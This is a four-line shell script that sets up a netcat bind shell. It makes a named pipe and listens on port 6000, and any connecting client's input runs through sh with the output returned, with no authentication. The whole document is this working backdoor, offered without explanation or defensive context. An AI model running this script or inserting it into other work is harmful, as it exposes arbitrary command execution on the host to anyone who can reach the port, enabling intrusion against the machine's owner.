#!/bin/sh

mkfifo fifo
nc -lp 6000 < fifo | sh > fifo

